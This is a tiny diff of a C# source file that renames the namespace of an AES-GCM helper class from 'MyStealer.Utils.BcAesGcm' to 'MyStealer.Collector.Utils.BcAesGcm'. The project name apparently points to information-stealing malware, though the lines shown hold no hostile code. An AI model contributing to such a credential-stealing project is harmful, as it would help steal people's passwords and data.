@@ -1,7 +1,7 @@
 using System;
 using System.Collections.Generic;
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     [Obsolete("Will be removed")]
     public class Tables1kGcmExponentiator
